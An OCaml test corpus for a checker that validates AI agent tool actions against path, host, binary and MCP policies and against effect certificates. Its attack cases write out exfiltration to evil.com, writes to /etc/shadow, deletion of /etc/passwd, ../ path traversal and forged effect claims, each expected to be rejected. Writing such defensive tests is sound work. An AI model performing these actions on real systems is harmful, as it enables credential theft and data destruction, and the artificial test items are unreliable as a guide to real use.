(** {1 Evaluation Corpus}

    {b [SUPPORT]} — Structured security cases for evaluation.

    Tier 1: Core cases (12) — one per attack class.
    Tier 2: Edge cases (12) — normalization, forgery, MCP, large policy.
    Scalability: Generated cases with varying policy sizes. *)

open Types

(* ================================================================== *)
(* Case representation                                                 *)
(* ================================================================== *)

type eval_case = {
  name     : string;
  category : string;   (** "benign", "attack", or "scale" *)
  action   : action;
  policy   : policy;
  proof    : proof;
  expected : check_result;
}

(* ================================================================== *)
(* Shared policies                                                     *)
(* ================================================================== *)

let standard_policy : policy = {
  readable_paths = ["/home/user/src"; "/usr/share/doc"];
  writable_paths = ["/home/user/src"; "/tmp"];
  allowed_bins   = ["grep"; "curl"; "find"];
  allowed_hosts  = ["example.com"; "api.github.com"];
  allowed_mcp    = [("files", "read_file"); ("search", "query")];
}

let empty_policy : policy = {
  readable_paths = [];
  writable_paths = [];
  allowed_bins   = [];
  allowed_hosts  = [];
  allowed_mcp    = [];
}

(** A large policy with N allowed paths/hosts for scalability testing. *)
let large_policy n : policy = {
  readable_paths = List.init n (fun i -> Printf.sprintf "/data/dir%d" i);
  writable_paths = List.init n (fun i -> Printf.sprintf "/out/dir%d" i);
  allowed_bins   = ["grep"; "curl"; "find"];
  allowed_hosts  = List.init n (fun i -> Printf.sprintf "host%d.example.com" i);
  allowed_mcp    = List.init n (fun i -> (Printf.sprintf "srv%d" i, "tool"));
}

(* ================================================================== *)
(* Helpers                                                             *)
(* ================================================================== *)

let honest_cert ?(approval = None) action =
  let effects = Infer.infer_effects action in
  { claimed_effects = effects;
    destructive = Infer.is_destructive action;
    approval; explanation = None }

(* ================================================================== *)
(* Tier 1: Core cases (12)                                             *)
(* ================================================================== *)

let tier1 : eval_case list = [
  (* Benign *)
  { name = "T1_valid_grep"; category = "benign";
    action = GrepRecursive { pattern = "TODO"; root = "/home/user/src";
      output = "/tmp/todos.txt" };
    policy = standard_policy;
    proof = honest_cert (GrepRecursive { pattern = "TODO";
      root = "/home/user/src"; output = "/tmp/todos.txt" });
    expected = Accepted };

  { name = "T1_valid_curl"; category = "benign";
    action = CurlToFile { url = "https://example.com/data.json";
      host = "example.com"; output = "/tmp/data.json" };
    policy = standard_policy;
    proof = honest_cert (CurlToFile { url = "https://example.com/data.json";
      host = "example.com"; output = "/tmp/data.json" });
    expected = Accepted };

  { name = "T1_valid_mcp"; category = "benign";
    action = McpCall { server = "files"; tool = "read_file";
      args = {|{"path":"main.ml"}|} };
    policy = standard_policy;
    proof = honest_cert (McpCall { server = "files"; tool = "read_file";
      args = {|{"path":"main.ml"}|} });
    expected = Accepted };

  { name = "T1_approved_destructive"; category = "benign";
    action = RemoveByGlob { root = "/tmp"; suffix = ".log";
      recursive = true };
    policy = standard_policy;
    proof = honest_cert
      ~approval:(Some (ApprovedDestructive "ticket-42"))
      (RemoveByGlob { root = "/tmp"; suffix = ".log"; recursive = true });
    expected = Accepted };

  (* Attacks *)
  { name = "T1_unauthorized_write"; category = "attack";
    action = GrepRecursive { pattern = "secret"; root = "/home/user/src";
      output = "/etc/shadow" };
    policy = standard_policy;
    proof = honest_cert (GrepRecursive { pattern = "secret";
      root = "/home/user/src"; output = "/etc/shadow" });
    expected = Rejected (UnauthorizedWrite "/etc/shadow") };

  { name = "T1_unauthorized_host"; category = "attack";
    action = CurlToFile { url = "https://evil.com/exfil"; host = "evil.com";
      output = "/tmp/payload" };
    policy = standard_policy;
    proof = honest_cert (CurlToFile { url = "https://evil.com/exfil";
      host = "evil.com"; output = "/tmp/payload" });
    expected = Rejected (UnauthorizedHost "evil.com") };

  { name = "T1_unauthorized_mcp"; category = "attack";
    action = McpCall { server = "files"; tool = "delete_file";
      args = {|{"path":"/etc/passwd"}|} };
    policy = standard_policy;
    proof = honest_cert (McpCall { server = "files"; tool = "delete_file";
      args = {|{"path":"/etc/passwd"}|} });
    expected = Rejected (UnauthorizedMcpTool ("files", "delete_file")) };

  { name = "T1_no_approval"; category = "attack";
    action = RemoveByGlob { root = "/tmp"; suffix = ".tmp";
      recursive = true };
    policy = standard_policy;
    proof = honest_cert (RemoveByGlob { root = "/tmp"; suffix = ".tmp";
      recursive = true });
    expected = Rejected MissingDestructiveApproval };

  { name = "T1_forged_reorder"; category = "attack";
    action = GrepRecursive { pattern = "x"; root = "/home/user/src";
      output = "/tmp/out" };
    policy = standard_policy;
    proof = { claimed_effects = [ WritePath "/tmp/out"; ExecBin "grep";
      ReadPath "/home/user/src" ];
      destructive = false; approval = None; explanation = None };
    expected = Rejected ClaimedEffectsMismatch };

  { name = "T1_forged_subset"; category = "attack";
    action = CurlToFile { url = "https://example.com/f";
      host = "example.com"; output = "/tmp/f" };
    policy = standard_policy;
    proof = { claimed_effects = [ NetTo "example.com" ];
      destructive = false; approval = None; explanation = None };
    expected = Rejected ClaimedEffectsMismatch };

  { name = "T1_default_deny"; category = "attack";
    action = GrepRecursive { pattern = "x"; root = "/data";
      output = "/out" };
    policy = empty_policy;
    proof = honest_cert (GrepRecursive { pattern = "x"; root = "/data";
      output = "/out" });
    expected = Rejected (UnauthorizedRead "/data") };

  { name = "T1_path_escape"; category = "attack";
    action = GrepRecursive { pattern = "secret";
      root = "/home/user/src/../../../etc"; output = "/tmp/secrets.txt" };
    policy = standard_policy;
    proof = honest_cert (GrepRecursive { pattern = "secret";
      root = "/home/user/src/../../../etc"; output = "/tmp/secrets.txt" });
    expected = Rejected
      (PathTraversalBlocked "/home/user/src/../../../etc") };
]

(* ================================================================== *)
(* Tier 2: Edge cases (12)                                             *)
(* ================================================================== *)

let tier2 : eval_case list = [
  (* Path normalization edge cases *)
  { name = "T2_read_nested_allowed"; category = "benign";
    action = GrepRecursive { pattern = "fn"; root = "/home/user/src/lib/core";
      output = "/tmp/fns.txt" };
    policy = standard_policy;
    proof = honest_cert (GrepRecursive { pattern = "fn";
      root = "/home/user/src/lib/core"; output = "/tmp/fns.txt" });
    expected = Accepted };

  { name = "T2_sibling_prefix_reject"; category = "attack";
    action = GrepRecursive { pattern = "x"; root = "/home/user/src2";
      output = "/tmp/out" };
    policy = standard_policy;
    proof = honest_cert (GrepRecursive { pattern = "x";
      root = "/home/user/src2"; output = "/tmp/out" });
    expected = Rejected (UnauthorizedRead "/home/user/src2") };

  { name = "T2_write_to_read_only"; category = "attack";
    action = GrepRecursive { pattern = "x"; root = "/usr/share/doc";
      output = "/usr/share/doc/out.txt" };
    policy = standard_policy;
    proof = honest_cert (GrepRecursive { pattern = "x";
      root = "/usr/share/doc"; output = "/usr/share/doc/out.txt" });
    expected = Rejected (UnauthorizedWrite "/usr/share/doc/out.txt") };

  (* Certificate forgery variants *)
  { name = "T2_forged_extra_effect"; category = "attack";
    action = McpCall { server = "search"; tool = "query"; args = "{}" };
    policy = standard_policy;
    proof = { claimed_effects = [ McpUse ("search", "query");
      WritePath "/tmp/sneaky" ];
      destructive = false; approval = None; explanation = None };
    expected = Rejected ClaimedEffectsMismatch };

  { name = "T2_forged_empty_effects"; category = "attack";
    action = GrepRecursive { pattern = "x"; root = "/home/user/src";
      output = "/tmp/out" };
    policy = standard_policy;
    proof = { claimed_effects = [];
      destructive = false; approval = None; explanation = None };
    expected = Rejected ClaimedEffectsMismatch };

  { name = "T2_forged_wrong_binary"; category = "attack";
    action = GrepRecursive { pattern = "x"; root = "/home/user/src";
      output = "/tmp/out" };
    policy = standard_policy;
    proof = { claimed_effects = [ ReadPath "/home/user/src";
      ExecBin "rm"; WritePath "/tmp/out" ];
      destructive = false; approval = None; explanation = None };
    expected = Rejected ClaimedEffectsMismatch };

  (* MCP authorization combinations *)
  { name = "T2_mcp_wrong_server"; category = "attack";
    action = McpCall { server = "admin"; tool = "read_file";
      args = "{}" };
    policy = standard_policy;
    proof = honest_cert (McpCall { server = "admin";
      tool = "read_file"; args = "{}" });
    expected = Rejected (UnauthorizedMcpTool ("admin", "read_file")) };

  { name = "T2_mcp_second_tool"; category = "benign";
    action = McpCall { server = "search"; tool = "query"; args = "{}" };
    policy = standard_policy;
    proof = honest_cert (McpCall { server = "search"; tool = "query";
      args = "{}" });
    expected = Accepted };

  { name = "T2_mcp_right_server_wrong_tool"; category = "attack";
    action = McpCall { server = "search"; tool = "delete"; args = "{}" };
    policy = standard_policy;
    proof = honest_cert (McpCall { server = "search"; tool = "delete";
      args = "{}" });
    expected = Rejected (UnauthorizedMcpTool ("search", "delete")) };

  (* Host authorization *)
  { name = "T2_curl_second_host"; category = "benign";
    action = CurlToFile { url = "https://api.github.com/repos";
      host = "api.github.com"; output = "/tmp/repos.json" };
    policy = standard_policy;
    proof = honest_cert (CurlToFile { url = "https://api.github.com/repos";
      host = "api.github.com"; output = "/tmp/repos.json" });
    expected = Accepted };

  { name = "T2_unauthorized_binary"; category = "attack";
    action = GrepRecursive { pattern = "x"; root = "/home/user/src";
      output = "/tmp/out" };
    policy = { standard_policy with allowed_bins = ["curl"; "find"] };
    proof = honest_cert (GrepRecursive { pattern = "x";
      root = "/home/user/src"; output = "/tmp/out" });
    expected = Rejected (UnauthorizedBinary "grep") };

  (* Default deny on specific field *)
  { name = "T2_deny_all_mcp"; category = "attack";
    action = McpCall { server = "files"; tool = "read_file"; args = "{}" };
    policy = { standard_policy with allowed_mcp = [] };
    proof = honest_cert (McpCall { server = "files"; tool = "read_file";
      args = "{}" });
    expected = Rejected (UnauthorizedMcpTool ("files", "read_file")) };
]

(* ================================================================== *)
(* Scalability cases: large policies                                   *)
(* ================================================================== *)

let scale_cases : eval_case list =
  List.map (fun n ->
    let pol = large_policy n in
    (* Action that reads from the LAST allowed path *)
    let root = Printf.sprintf "/data/dir%d" (n - 1) in
    let action = GrepRecursive { pattern = "x"; root;
      output = Printf.sprintf "/out/dir%d/result.txt" (n - 1) } in
    { name = Printf.sprintf "scale_%d_paths" n;
      category = "scale";
      action;
      policy = pol;
      proof = honest_cert action;
      expected = Accepted }
  ) [10; 50; 100; 500; 1000]

(* ================================================================== *)
(* Full corpus                                                         *)
(* ================================================================== *)

let corpus : eval_case list = tier1 @ tier2 @ scale_cases

let benign_count =
  List.length (List.filter (fun c -> c.category = "benign") corpus)
let attack_count =
  List.length (List.filter (fun c -> c.category = "attack") corpus)
let scale_count =
  List.length (List.filter (fun c -> c.category = "scale") corpus)
